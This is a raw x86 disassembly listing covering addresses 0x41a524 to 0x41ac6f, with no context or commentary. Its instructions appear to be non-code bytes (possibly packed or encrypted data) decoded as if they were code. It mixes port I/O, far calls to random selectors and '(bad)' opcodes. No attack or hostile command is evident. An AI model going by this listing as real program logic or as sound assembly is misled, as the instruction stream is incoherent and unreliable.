  41a524:	jl     0x41a55a
  41a526:	add    DWORD PTR [ecx],esp
  41a528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a529:	cld    
  41a52a:	push   ebp
  41a52b:	mov    dh,0xe7
  41a52d:	mov    dh,0xbb
  41a52f:	jg     0x41a4e4
  41a531:	lods   al,BYTE PTR ds:[esi]
  41a532:	inc    edi
  41a533:	jae    0x41a54a
  41a535:	icebp  
  41a536:	repz cld 
  41a538:	lods   al,BYTE PTR ds:[esi]
  41a539:	call   0xe7ad453d
  41a53e:	lea    edi,[esp+edx*4]
  41a541:	arpl   WORD PTR [ecx],sp
  41a543:	arpl   WORD PTR ds:0x9b643300,ax
  41a549:	outs   dx,BYTE PTR ds:[esi]
  41a54a:	js     0x41a509
  41a54c:	mov    ebp,0x4a17d1f5
  41a551:	mov    edi,DWORD PTR [esi]
  41a553:	enter  0x37cc,0x4
  41a557:	pop    edx
  41a558:	cmp    eax,0xec4e7784
  41a55d:	adc    esp,ebp
  41a55f:	bound  esi,QWORD PTR [edx+0x5]
  41a562:	dec    edx
  41a563:	fdivr  DWORD PTR [ebx+edx*2]
  41a566:	jbe    0x41a505
  41a568:	aas    
  41a569:	inc    edx
  41a56a:	jp     0x41a553
  41a56c:	dec    ebx
  41a56d:	pushw  0x99c
  41a571:	xor    al,0x4e
  41a573:	push   ss
  41a574:	adc    al,0x8f
  41a576:	cmp    ecx,0x63
  41a579:	mov    cl,0x20
  41a57b:	add    BYTE PTR [ebx+0x2a],0x82
  41a57f:	add    cl,dh
  41a581:	iret   
  41a582:	js     0x41a5e2
  41a584:	inc    eax
  41a585:	pop    eax
  41a586:	sub    cl,BYTE PTR ds:0x5ee9bcc1
  41a58c:	mov    cl,0x27
  41a58e:	xchg   edx,eax
  41a58f:	sahf   
  41a590:	das    
  41a591:	lahf   
  41a592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a593:	xchg   edi,eax
  41a594:	mov    bl,0x40
  41a596:	or     DWORD PTR [esi+ecx*8],esi
  41a599:	dec    ebp
  41a59a:	sbb    ebp,DWORD PTR [esi+0x52d573aa]
  41a5a0:	adc    eax,DWORD PTR [edx+eiz*1+0x4f]
  41a5a4:	ror    BYTE PTR [ecx+0x637a9ee2],cl
  41a5aa:	jge    0x41a5b4
  41a5ac:	sbb    eax,DWORD PTR [edi-0x4b]
  41a5af:	int3   
  41a5b0:	sub    edx,0xffffffa3
  41a5b3:	jae    0x41a54d
  41a5b5:	ins    BYTE PTR es:[edi],dx
  41a5b6:	call   0xa8ea8d31
  41a5bb:	ffree  st(3)
  41a5bd:	pop    esi
  41a5be:	inc    eax
  41a5bf:	or     esp,DWORD PTR [eax]
  41a5c1:	inc    ebp
  41a5c2:	out    dx,eax
  41a5c3:	stos   DWORD PTR es:[edi],eax
  41a5c4:	pop    ebx
  41a5c5:	inc    eax
  41a5c6:	jle    0x41a5db
  41a5c8:	sub    al,0xa8
  41a5ca:	out    0x7f,eax
  41a5cc:	jne    0x41a5d3
  41a5ce:	xor    dl,bh
  41a5d0:	xchg   ebp,eax
  41a5d1:	mov    ah,bh
  41a5d3:	fidiv  WORD PTR [ebx]
  41a5d5:	mov    cl,0xcc
  41a5d7:	scas   al,BYTE PTR es:[edi]
  41a5d8:	sub    ebx,DWORD PTR [ebx-0x64d46f2f]
  41a5de:	rcr    DWORD PTR [esp+edx*2-0x707c57d1],0x44
  41a5e6:	mov    BYTE PTR [esi],ah
  41a5e8:	fs leave 
  41a5ea:	pop    eax
  41a5eb:	mov    WORD PTR [eax-0x31],ss
  41a5ee:	jae    0x41a5d8
  41a5f0:	xor    ah,dh
  41a5f2:	mov    eax,0x486846a
  41a5f7:	in     eax,0x41
  41a5f9:	lahf   
  41a5fa:	and    ch,BYTE PTR [esi+0x60]
  41a5fd:	pop    esp
  41a5fe:	stos   BYTE PTR es:[edi],al
  41a5ff:	out    0xb3,al
  41a601:	push   ss
  41a602:	call   0x4e1c:0x758e4473
  41a609:	sbb    al,0x8e
  41a60b:	(bad)  
  41a60c:	out    0xb4,eax
  41a60e:	jmp    0x977b:0xb0102d2b
  41a615:	sub    dh,BYTE PTR [edx]
  41a617:	add    BYTE PTR [eax],cl
  41a619:	je     0x41a65c
  41a61b:	idiv   al
  41a61d:	in     al,0x14
  41a61f:	or     al,0x75
  41a621:	js     0x41a605
  41a623:	mov    bh,0xc6
  41a625:	jge    0x41a60c
  41a627:	pop    ds
  41a628:	test   al,0xb6
  41a62a:	mov    esi,0xaa161599
  41a62f:	push   ebp
  41a630:	mov    al,0x24
  41a632:	inc    ecx
  41a633:	and    ecx,esi
  41a635:	iret   
  41a636:	out    0x68,al
  41a638:	mov    dh,0x32
  41a63a:	cli    
  41a63b:	mov    DWORD PTR [edi],ecx
  41a63d:	mov    ebp,0x27458f7a
  41a642:	pushf  
  41a643:	inc    edx
  41a644:	lahf   
  41a645:	mov    esi,0x56c36356
  41a64a:	std    
  41a64b:	inc    edi
  41a64c:	sbb    edi,ebx
  41a64e:	(bad)  
  41a64f:	jl     0x41a672
  41a651:	fcomp  DWORD PTR [ebp-0x44]
  41a654:	(bad)  
  41a655:	shr    BYTE PTR [ebx-0x5e6bb3d4],cl
  41a65b:	fsubr  st,st(1)
  41a65d:	int3   
  41a65e:	int3   
  41a65f:	dec    ebx
  41a660:	imul   edi,DWORD PTR [ecx+ebx*2+0x36daaee7],0xe163608d
  41a66b:	nop
  41a66c:	loopne 0x41a5f8
  41a66e:	popf   
  41a66f:	nop
  41a670:	mov    dh,0x70
  41a672:	push   0x9cf11ce
  41a677:	fcomp  QWORD PTR [edx+0x1e566069]
  41a67d:	jl     0x41a6ae
  41a67f:	outs   dx,DWORD PTR ds:[esi]
  41a680:	or     bl,dl
  41a682:	cld    
  41a683:	push   esi
  41a684:	and    al,0x96
  41a686:	addr16 data16 int3 
  41a689:	sahf   
  41a68a:	loop   0x41a648
  41a68c:	jb     0x41a646
  41a68e:	jb     0x41a658
  41a690:	test   al,0x92
  41a692:	addr16 aas 
  41a694:	popf   
  41a695:	cli    
  41a696:	sbb    BYTE PTR [edx],dl
  41a698:	mov    eax,ds:0xffa1af8
  41a69d:	lods   al,BYTE PTR ds:[esi]
  41a69e:	push   edi
  41a69f:	push   0xffffffea
  41a6a1:	or     al,0x54
  41a6a3:	and    DWORD PTR ds:0xf05efd46,edi
  41a6a9:	xchg   edi,eax
  41a6aa:	and    BYTE PTR [ebx-0x69],dh
  41a6ad:	loope  0x41a691
  41a6af:	jp     0x41a696
  41a6b1:	addr16 ret 0x6ac4
  41a6b5:	stos   DWORD PTR es:[edi],eax
  41a6b6:	icebp  
  41a6b7:	jo     0x41a708
  41a6b9:	scas   eax,DWORD PTR es:[edi]
  41a6ba:	nop
  41a6bb:	dec    esi
  41a6bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6bd:	hlt    
  41a6be:	xchg   edi,eax
  41a6bf:	pop    eax
  41a6c0:	shl    BYTE PTR [esi-0x3c],1
  41a6c3:	popa   
  41a6c4:	dec    ecx
  41a6c5:	retf   0xd56a
  41a6c8:	(bad)  
  41a6c9:	faddp  st(7),st
  41a6cb:	call   0x18be:0xa4a1f267
  41a6d2:	dec    ebx
  41a6d3:	(bad)  [edi-0xaf7c220]
  41a6d9:	sar    BYTE PTR [ebx+0x3710423c],0x4b
  41a6e0:	scas   al,BYTE PTR es:[edi]
  41a6e1:	pusha  
  41a6e2:	mov    bh,0xc5
  41a6e4:	mov    dl,BYTE PTR [ebx-0x4d]
  41a6e7:	push   0xcb5d0cd9
  41a6ec:	test   BYTE PTR [edi-0x5a],0xae
  41a6f0:	stos   DWORD PTR es:[edi],eax
  41a6f1:	sbb    BYTE PTR [bx+di+0x7d],0x4e
  41a6f6:	ds jae 0x41a737
  41a6f9:	repz mov ah,0xb6
  41a6fc:	stc    
  41a6fd:	xor    eax,DWORD PTR [edi+edx*4]
  41a700:	nop
  41a701:	daa    
  41a702:	gs out dx,al
  41a704:	sub    eax,0x9b33c18a
  41a709:	repz scas al,BYTE PTR es:[edi]
  41a70b:	jne    0x41a73b
  41a70d:	dec    edi
  41a70e:	push   edx
  41a70f:	daa    
  41a710:	loop   0x41a6fc
  41a712:	sbb    al,dh
  41a714:	inc    esp
  41a715:	push   0x31df7f27
  41a71a:	xchg   ebx,eax
  41a71b:	rol    BYTE PTR [ebx],cl
  41a71d:	and    bl,BYTE PTR [esi-0x45e0df7b]
  41a723:	push   cs
  41a724:	sub    BYTE PTR [ecx+0x2c],0xe8
  41a728:	or     al,0x61
  41a72a:	or     DWORD PTR [ecx],edx
  41a72c:	cs (bad) 
  41a72e:	repnz enter 0x1e12,0xdb
  41a733:	xchg   esp,eax
  41a734:	jnp    0x41a767
  41a736:	imul   esi,edx,0x6e
  41a739:	out    0xb7,eax
  41a73b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a73c:	pop    esi
  41a73d:	pop    edi
  41a73e:	shr    BYTE PTR [esi-0x6f],cl
  41a741:	enter  0xf0c0,0xa3
  41a745:	xor    al,0xae
  41a747:	fst    QWORD PTR [ebx]
  41a749:	sbb    edi,DWORD PTR [edi+0x11]
  41a74c:	add    dl,al
  41a74e:	mov    al,ds:0x2e1252be
  41a753:	sbb    eax,0x21a080ef
  41a758:	sub    eax,0xad6e7b93
  41a75d:	and    al,0x89
  41a75f:	test   DWORD PTR [edi-0x71],esi
  41a762:	cdq    
  41a763:	push   eax
  41a764:	push   eax
  41a765:	push   ebx
  41a766:	leave  
  41a767:	idiv   edx
  41a769:	ret    
  41a76a:	push   es
  41a76b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a76c:	ss and bh,dl
  41a76f:	sar    BYTE PTR [edi],0x51
  41a772:	int    0xb9
  41a774:	in     al,dx
  41a775:	jle    0x41a7eb
  41a777:	aas    
  41a778:	and    eax,0x7660891d
  41a77d:	cmp    BYTE PTR [edi],ch
  41a77f:	inc    eax
  41a780:	psllw  mm2,0x70
  41a784:	iret   
  41a785:	inc    ecx
  41a786:	mov    dl,0xc0
  41a788:	jmp    0x8fec:0x50208140
  41a78f:	and    esp,DWORD PTR [edx-0x71]
  41a792:	inc    ebp
  41a793:	pop    ecx
  41a794:	sbb    al,BYTE PTR [ecx-0x17]
  41a797:	sub    bl,ah
  41a799:	mov    bh,0x92
  41a79b:	or     ch,cl
  41a79d:	out    dx,al
  41a79e:	es push edx
  41a7a0:	jnp    0x41a80d
  41a7a2:	or     ch,bh
  41a7a4:	sbb    dl,BYTE PTR [ebx-0x6b6f4398]
  41a7aa:	scas   eax,DWORD PTR es:[edi]
  41a7ab:	push   0x57
  41a7ad:	(bad)  
  41a7ae:	jnp    0x41a7d3
  41a7b0:	test   DWORD PTR [ecx-0x3035d23c],ebx
  41a7b6:	call   0x8b86:0xb4c2a36b
  41a7bd:	loopne 0x41a82d
  41a7bf:	cmc    
  41a7c0:	xchg   eax,edx
  41a7c2:	pop    ds
  41a7c3:	(bad)  
  41a7c4:	xor    eax,0x5e507132
  41a7c9:	mov    WORD PTR [edi+0xee68552],?
  41a7cf:	jo     0x41a82a
  41a7d1:	sbb    eax,0x9ec4eb6
  41a7d6:	in     eax,0x20
  41a7d8:	push   edx
  41a7d9:	je     0x41a761
  41a7db:	iret   
  41a7dc:	or     bl,dl
  41a7de:	pavgb  mm6,QWORD PTR [ecx-0xa]
  41a7e2:	xor    DWORD PTR [ebx+0x7b],eax
  41a7e5:	sbb    ecx,DWORD PTR [edx+0x4d6aa9f7]
  41a7eb:	xor    bl,BYTE PTR [esi-0x27]
  41a7ee:	mov    cl,0xb8
  41a7f0:	rcl    ah,cl
  41a7f2:	mov    ebp,0xadc4773c
  41a7f7:	cli    
  41a7f8:	pop    eax
  41a7f9:	fistp  DWORD PTR [edx-0x69]
  41a7fc:	and    BYTE PTR [ebx+0xe],dh
  41a7ff:	sub    DWORD PTR [edx-0x75],0x74
  41a803:	fwait
  41a804:	out    0xdc,al
  41a806:	in     al,dx
  41a807:	sahf   
  41a808:	mov    dh,BYTE PTR [ebp+0x79]
  41a80b:	jnp    0x41a829
  41a80d:	jl     0x41a7e8
  41a80f:	and    DWORD PTR [ecx+edi*4-0x7cf0a54c],edx
  41a816:	hlt    
  41a817:	and    edx,DWORD PTR [eax+0x71]
  41a81a:	retf   0xc40c
  41a81d:	mov    eax,ds:0x8fb77942
  41a822:	int3   
  41a823:	add    BYTE PTR [ecx+0xe135e84],cl
  41a829:	sbb    DWORD PTR [ecx-0x25],esi
  41a82c:	cmp    al,0x17
  41a82e:	jae    0x41a854
  41a830:	dec    esp
  41a831:	xor    ah,bh
  41a833:	pop    eax
  41a834:	pop    esi
  41a835:	rcl    BYTE PTR [eax+0x16],1
  41a838:	mov    bh,0xfc
  41a83a:	cmp    BYTE PTR [ecx-0x4f0fd462],al
  41a840:	sbb    DWORD PTR [eax+ebp*8-0xb],ecx
  41a844:	loope  0x41a80c
  41a846:	mov    bh,0x99
  41a848:	push   ebx
  41a849:	jae    0x41a833
  41a84b:	jg     0x41a836
  41a84d:	push   ss
  41a84e:	xor    esp,DWORD PTR [ecx+eax*1]
  41a851:	sub    dl,0x1
  41a854:	add    BYTE PTR [ebx+0x1a],0x88
  41a858:	pop    eax
  41a859:	xchg   esi,eax
  41a85a:	adc    BYTE PTR [edx+0x5cc5ef5d],bl
  41a860:	not    ah
  41a862:	push   ds
  41a863:	adc    cl,BYTE PTR [edx+0x32f0ac4a]
  41a869:	jnp    0x41a8b5
  41a86b:	cs das 
  41a86d:	inc    eax
  41a86e:	loopne 0x41a80f
  41a870:	sub    al,0xdd
  41a872:	xor    eax,0x2f6174a4
  41a877:	imul   ecx,DWORD PTR [edi],0xc4ecb46f
  41a87d:	pop    ecx
  41a87e:	jb     0x41a867
  41a880:	fs cld 
  41a882:	mov    BYTE PTR [ebx+0x14cd7755],ah
  41a888:	mov    al,0xcb
  41a88a:	mov    cl,0x99
  41a88c:	arpl   bx,si
  41a88e:	xor    al,BYTE PTR [ebp-0x1b]
  41a891:	and    BYTE PTR ds:0xe049c824,ah
  41a897:	push   0xffffffc3
  41a899:	pushf  
  41a89a:	mov    dh,0x60
  41a89c:	or     dl,BYTE PTR [eax]
  41a89e:	in     eax,0x38
  41a8a0:	mov    ebx,DWORD PTR [ebx+eiz*1+0x72]
  41a8a4:	and    al,0x3a
  41a8a6:	fmul   DWORD PTR [ebp+0x1f4fe93d]
  41a8ac:	cdq    
  41a8ad:	shl    esi,cl
  41a8af:	bound  ebx,QWORD PTR [edi+edi*4-0x3efb57fd]
  41a8b6:	xchg   ecx,eax
  41a8b7:	iret   
  41a8b8:	out    dx,al
  41a8b9:	fs hlt 
  41a8bb:	repnz adc dl,BYTE PTR es:[edi+0x51032658]
  41a8c3:	dec    sp
  41a8c5:	mov    eax,DWORD PTR [esi]
  41a8c7:	outs   dx,BYTE PTR ds:[esi]
  41a8c8:	icebp  
  41a8c9:	and    esi,esi
  41a8cb:	mov    eax,0xb83bde0f
  41a8d0:	loope  0x41a8a6
  41a8d2:	imul   DWORD PTR [ecx]
  41a8d4:	pop    ecx
  41a8d5:	sbb    BYTE PTR [edi-0x47],al
  41a8d8:	pusha  
  41a8d9:	lock lods eax,DWORD PTR ds:[esi]
  41a8db:	cld    
  41a8dc:	data16 jns 0x41a878
  41a8df:	stos   DWORD PTR es:[edi],eax
  41a8e0:	or     BYTE PTR [edx],ch
  41a8e2:	aam    0x26
  41a8e4:	xchg   ebp,eax
  41a8e5:	pop    ss
  41a8e6:	mov    gs,WORD PTR [eax-0x6b]
  41a8e9:	mov    esp,0xd4c22cf9
  41a8ee:	bnd jmp 0x4c93d3b6
  41a8f4:	mov    ebx,0x4bb3b080
  41a8f9:	jmp    0xdc2b44aa
  41a8fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8ff:	mov    ds,WORD PTR [edx+0x30ee421c]
  41a905:	das    
  41a906:	adc    edx,ebx
  41a908:	retf   
  41a909:	xor    ebp,ebp
  41a90b:	inc    ebx
  41a90c:	popa   
  41a90d:	ds mov ebp,0x4abe4540
  41a913:	test   eax,0xb6255ca2
  41a919:	xor    al,0xe2
  41a91b:	mov    BYTE PTR [ebx+eiz*8],dh
  41a91e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a91f:	fcomp  st(3)
  41a921:	int3   
  41a922:	test   BYTE PTR [eax],0x8
  41a925:	xor    dh,BYTE PTR [eax-0x79]
  41a928:	ror    edi,cl
  41a92a:	in     eax,0x2b
  41a92c:	fdivr  st,st(4)
  41a92e:	sub    dh,BYTE PTR [ebx-0xc1b05a8]
  41a934:	xchg   esp,eax
  41a935:	lods   al,BYTE PTR ds:[esi]
  41a936:	dec    ebp
  41a937:	xchg   edi,eax
  41a938:	std    
  41a939:	imul   edx,DWORD PTR [ecx+edi*1+0x5c983cc9],0xd5383896
  41a944:	call   0xccaa:0x8217b037
  41a94b:	pop    esp
  41a94c:	dec    edx
  41a94d:	cld    
  41a94e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a94f:	mov    bh,0x63
  41a951:	mov    al,ds:0x97305cdb
  41a956:	sti    
  41a957:	nop
  41a958:	add    dh,BYTE PTR [edi*8+0x5290a867]
  41a95f:	jmp    0xd94eb96e
  41a964:	xchg   ah,al
  41a966:	cmp    BYTE PTR [esi],dl
  41a968:	or     esp,DWORD PTR [edi+0x3fb03cc4]
  41a96e:	es dec edi
  41a970:	dec    ebx
  41a971:	push   ds
  41a972:	mov    dh,dl
  41a974:	sahf   
  41a975:	push   esi
  41a976:	cmp    edx,esp
  41a978:	sub    ah,BYTE PTR [ebx-0x63]
  41a97b:	inc    ebp
  41a97c:	mov    dl,0x17
  41a97e:	mov    ebp,0x27dd9ac8
  41a983:	jo     0x41a9b6
  41a985:	sub    al,0xea
  41a987:	pop    edx
  41a988:	hlt    
  41a989:	add    al,0xe1
  41a98b:	je     0x41aa07
  41a98d:	outs   dx,BYTE PTR ds:[esi]
  41a98e:	push   es
  41a98f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a990:	inc    esi
  41a991:	aad    0x57
  41a993:	aam    0xfa
  41a995:	push   edi
  41a996:	xchg   DWORD PTR [ebx-0xb],ebp
  41a999:	and    eax,0xeeef058c
  41a99e:	push   esp
  41a99f:	or     ebp,0x894baa50
  41a9a5:	test   BYTE PTR [ecx],dl
  41a9a7:	ror    BYTE PTR [ebx-0x42a4742f],0xa0
  41a9ae:	inc    esp
  41a9af:	pop    ss
  41a9b0:	retf   
  41a9b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9b2:	cli    
  41a9b3:	adc    eax,0xe5950c66
  41a9b8:	dec    ecx
  41a9b9:	push   0xc84260d8
  41a9be:	pop    es
  41a9bf:	inc    esp
  41a9c0:	ss jp  0x41a98e
  41a9c3:	test   DWORD PTR [ebx-0x50],edx
  41a9c6:	or     DWORD PTR [edx-0x35],eax
  41a9c9:	cdq    
  41a9ca:	xchg   ebp,eax
  41a9cb:	loopne 0x41a9dc
  41a9cd:	cs jno 0x41a9dd
  41a9d0:	test   DWORD PTR ss:[ebp+eax*8+0x7e],ecx
  41a9d5:	or     eax,0xad3f1374
  41a9da:	in     al,0xb9
  41a9dc:	jge    0x41a9b6
  41a9de:	mov    ds:0xebf2dfc8,eax
  41a9e3:	xor    ebp,edx
  41a9e5:	add    BYTE PTR [edi+eax*4+0x291af3ee],cl
  41a9ec:	mov    al,0x16
  41a9ee:	loopne 0x41aa6e
  41a9f0:	mov    eax,ss
  41a9f2:	jae    0x41aa08
  41a9f4:	add    al,0xe8
  41a9f6:	xor    ebx,DWORD PTR [eax+0x22]
  41a9f9:	sub    BYTE PTR [ebp+0x7ceeb383],dl
  41a9ff:	adc    DWORD PTR [eax],esp
  41aa01:	jge    0x41aa50
  41aa03:	pop    DWORD PTR [ecx]
  41aa05:	dec    ebx
  41aa06:	mov    dh,0xd0
  41aa08:	clc    
  41aa09:	imul   esi,DWORD PTR [ecx-0x60],0x372f23b3
  41aa10:	stos   DWORD PTR es:[edi],eax
  41aa11:	sub    al,0xfd
  41aa13:	inc    edx
  41aa14:	mov    ah,ah
  41aa16:	mov    ebx,0x1a440a46
  41aa1b:	pop    ebx
  41aa1c:	dec    eax
  41aa1d:	sub    ch,bh
  41aa1f:	cmp    dl,BYTE PTR ss:[esi+0x3b]
  41aa23:	shl    DWORD PTR fs:[esi],1
  41aa26:	inc    eax
  41aa27:	or     dl,BYTE PTR [bp+si]
  41aa2a:	out    dx,al
  41aa2b:	add    eax,0x2a16eee9
  41aa30:	adc    bh,bh
  41aa32:	jo     0x41aa1f
  41aa34:	mov    DWORD PTR [ebx],edi
  41aa36:	call   0xf5df:0x61a7b94e
  41aa3d:	jne    0x41aa6c
  41aa3f:	xor    cl,BYTE PTR [esi]
  41aa41:	push   ss
  41aa42:	loope  0x41aa3d
  41aa44:	aas    
  41aa45:	mov    esi,0xe6ef1198
  41aa4a:	aad    0xb5
  41aa4c:	test   eax,0xdc4adc1e
  41aa51:	popf   
  41aa52:	or     cl,BYTE PTR [ebp-0x65]
  41aa55:	push   0xbad85afb
  41aa5a:	sbb    bh,ah
  41aa5c:	imul   ebp,ecx,0xffffffa9
  41aa5f:	jno    0x41aa46
  41aa61:	inc    edi
  41aa62:	sub    cl,bl
  41aa64:	sub    eax,0x6a581d3
  41aa69:	pop    ebx
  41aa6a:	pop    edi
  41aa6b:	mov    esi,0xffebd12f
  41aa70:	es cwde 
  41aa72:	sti    
  41aa73:	loope  0x41aaca
  41aa75:	int    0x6e
  41aa77:	aad    0xc5
  41aa79:	fld    TBYTE PTR [ebx]
  41aa7b:	xor    ch,cl
  41aa7d:	xor    dl,cl
  41aa7f:	dec    ebp
  41aa80:	and    DWORD PTR [edx],0x4e4ec331
  41aa86:	rol    ecx,cl
  41aa88:	retf   
  41aa89:	and    dl,BYTE PTR [edx-0x18]
  41aa8c:	inc    ecx
  41aa8d:	iret   
  41aa8e:	(bad)  
  41aa8f:	cmp    BYTE PTR [edx],al
  41aa91:	pop    esp
  41aa92:	cmp    DWORD PTR [ecx+ebx*2+0x41664201],ebp
  41aa99:	inc    edi
  41aa9a:	sbb    DWORD PTR ds:0xd9975081,ecx
  41aaa0:	add    ch,BYTE PTR [edi+0x57d119e1]
  41aaa6:	adc    al,BYTE PTR [edx+0x773db2fe]
  41aaac:	test   al,0x3a
  41aaae:	dec    ebx
  41aaaf:	lahf   
  41aab0:	es enterw 0xa5f9,0xb2
  41aab6:	lods   eax,DWORD PTR ds:[esi]
  41aab7:	in     eax,dx
  41aab8:	les    ebp,FWORD PTR [edx+ecx*1]
  41aabb:	pop    ebp
  41aabc:	inc    eax
  41aabd:	mov    ecx,0x161ff568
  41aac2:	(bad)  
  41aac3:	rcr    BYTE PTR ds:0x670da5a5,0x1
  41aaca:	arpl   sp,bx
  41aacc:	ins    DWORD PTR es:[edi],dx
  41aacd:	xchg   esi,ecx
  41aacf:	arpl   si,cx
  41aad1:	dec    esi
  41aad2:	xor    ch,bl
  41aad4:	sbb    cl,BYTE PTR [edi-0x9640183]
  41aada:	std    
  41aadb:	pop    esp
  41aadc:	dec    esp
  41aadd:	mov    ch,0xdb
  41aadf:	inc    esp
  41aae0:	inc    edi
  41aae1:	xor    edx,ecx
  41aae3:	ss clc 
  41aae5:	inc    eax
  41aae6:	mov    bh,0x31
  41aae8:	dec    eax
  41aae9:	daa    
  41aaea:	leave  
  41aaeb:	adc    al,0x74
  41aaed:	mov    ebp,0xcbdcff49
  41aaf2:	push   eax
  41aaf3:	jg     0x41aace
  41aaf5:	lds    ecx,FWORD PTR [edx-0x1d]
  41aaf8:	sub    BYTE PTR [ecx],ah
  41aafa:	add    edi,DWORD PTR [eax+0x13]
  41aafd:	or     DWORD PTR [edx+0x1f],esp
  41ab00:	rcl    DWORD PTR [edx+0x53],cl
  41ab03:	lods   eax,DWORD PTR ds:[esi]
  41ab04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab05:	sbb    ecx,DWORD PTR [edx-0x72a1250f]
  41ab0b:	arpl   WORD PTR [eax],di
  41ab0d:	mov    edi,0x248175f1
  41ab12:	sti    
  41ab13:	(bad)  
  41ab14:	mov    ds:0x6beb6328,al
  41ab19:	adc    ch,BYTE PTR [eax]
  41ab1b:	push   0xe
  41ab1d:	xchg   esi,eax
  41ab1e:	mov    es,WORD PTR es:0x94424bab
  41ab25:	mov    bl,0xe6
  41ab27:	call   0x57f6:0x815381fd
  41ab2e:	outs   dx,BYTE PTR ds:[esi]
  41ab2f:	adc    esi,DWORD PTR [eax-0x79]
  41ab32:	jg     0x41aac2
  41ab34:	dec    esp
  41ab35:	xchg   DWORD PTR [esi-0x7a],ecx
  41ab38:	or     esi,esp
  41ab3a:	push   edx
  41ab3b:	sub    dh,BYTE PTR [esi+esi*2-0x3af0a941]
  41ab42:	jae    0x41ab8d
  41ab44:	gs ja  0x41abb4
  41ab47:	cmp    BYTE PTR [ecx-0x20],ch
  41ab4a:	pop    es
  41ab4b:	fidiv  WORD PTR [eax]
  41ab4d:	test   al,0x8a
  41ab4f:	daa    
  41ab50:	ret    0xd5c7
  41ab53:	and    eax,0xb443d388
  41ab58:	pop    ebx
  41ab59:	xchg   DWORD PTR [esi+0x4520a04e],esp
  41ab5f:	test   eax,0xb421bbe1
  41ab64:	ds retf 
  41ab66:	jbe    0x41abc9
  41ab68:	push   esp
  41ab69:	fwait
  41ab6a:	rcl    BYTE PTR [edx+0x5810d34d],0x23
  41ab71:	sbb    ch,BYTE PTR [edx+0x77]
  41ab74:	xchg   BYTE PTR [eax],dl
  41ab76:	and    BYTE PTR ds:0xd86091dd,0x5b
  41ab7d:	call   0xdd69:0x4b94f6d9
  41ab84:	fcomp  DWORD PTR [edx-0x23b081b8]
  41ab8a:	rcl    DWORD PTR ds:0x5c6cd058,0x56
  41ab91:	div    BYTE PTR [ecx-0x40]
  41ab94:	cmp    DWORD PTR [edi],0xffffff95
  41ab97:	rcr    BYTE PTR [esi+0x41848f16],cl
  41ab9d:	mov    dh,0x72
  41ab9f:	lods   al,BYTE PTR ds:[esi]
  41aba0:	cmp    cl,al
  41aba2:	add    BYTE PTR [eax+0x74c2e4c4],dh
  41aba8:	scas   al,BYTE PTR es:[edi]
  41aba9:	xor    ecx,DWORD PTR [edi-0x78a01c5e]
  41abaf:	jg     0x41abaf
  41abb1:	imul   ecx,DWORD PTR [eax+0x7b],0x9b4faa13
  41abb8:	add    bl,dh
  41abba:	into   
  41abbb:	sbb    al,BYTE PTR [ecx-0x27]
  41abbe:	lods   al,BYTE PTR ds:[esi]
  41abbf:	mov    ds:0x8d781395,al
  41abc4:	mov    ds:0x1d0d5666,al
  41abc9:	fwait
  41abca:	bound  ebx,QWORD PTR [ecx+0x11]
  41abcd:	inc    ecx
  41abce:	pop    esi
  41abcf:	sub    al,0xc
  41abd1:	sub    BYTE PTR [edi+0x31],al
  41abd4:	sub    DWORD PTR [ebx],esp
  41abd6:	jbe    0x41ab96
  41abd8:	mov    BYTE PTR [ebp-0x60846332],0x42
  41abdf:	nop
  41abe0:	jb     0x41ab6c
  41abe2:	push   ebx
  41abe3:	ficomp WORD PTR [ecx]
  41abe5:	pop    edi
  41abe6:	xchg   esi,eax
  41abe7:	push   ebx
  41abe8:	mov    edi,0x37e4a1d4
  41abed:	mov    ecx,DWORD PTR [esi]
  41abef:	hlt    
  41abf0:	and    DWORD PTR [esi-0x77],0xa
  41abf4:	jle    0x41ac47
  41abf6:	rcr    DWORD PTR [ebx-0xd],1
  41abf9:	ins    BYTE PTR es:[edi],dx
  41abfa:	test   al,0x7d
  41abfc:	mov    bh,0x6d
  41abfe:	cmc    
  41abff:	adc    al,0x9f
  41ac01:	es in  al,0x5f
  41ac04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac05:	xor    ch,BYTE PTR [edx]
  41ac07:	xchg   ecx,eax
  41ac08:	in     eax,dx
  41ac09:	adc    eax,0xdcbc4494
  41ac0e:	sub    eax,0xe0e34f28
  41ac13:	popa   
  41ac14:	shr    BYTE PTR [ecx+0x7b],0xf7
  41ac18:	xor    eax,0xc757e0d9
  41ac1d:	pop    esp
  41ac1e:	inc    edx
  41ac1f:	dec    esp
  41ac20:	retf   
  41ac21:	jns    0x41ac14
  41ac23:	js     0x41abfa
  41ac25:	jp     0x41abc3
  41ac27:	ss and dl,dl
  41ac2a:	sbb    dl,0x5d
  41ac2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac2e:	dec    DWORD PTR [edx+0x53a5c77e]
  41ac34:	xchg   BYTE PTR [eax+0x5c846a1c],dl
  41ac3a:	out    dx,eax
  41ac3b:	cmp    dl,al
  41ac3d:	out    dx,eax
  41ac3e:	pop    esi
  41ac3f:	or     al,0x2c
  41ac41:	ds push es
  41ac43:	outs   dx,DWORD PTR ds:[esi]
  41ac44:	std    
  41ac45:	pop    esp
  41ac46:	repnz test DWORD PTR [ebx+ebp*8],eax
  41ac4a:	nop
  41ac4b:	add    esp,ebp
  41ac4d:	adc    al,0xd8
  41ac4f:	ins    BYTE PTR es:[edi],dx
  41ac50:	retf   0xd9
  41ac53:	dec    eax
  41ac54:	jmp    0x41ac0f
  41ac56:	and    al,0xf6
  41ac58:	or     ah,bl
  41ac5a:	call   0x5737:0x86230f1f
  41ac61:	jg     0x41ac56
  41ac63:	mov    bl,0xfd
  41ac65:	in     al,dx
  41ac66:	add    al,0x8d
  41ac68:	lock pop DWORD PTR [ebp-0x15c0b8a6]
  41ac6f:	sub    eax,0xaf2025fa
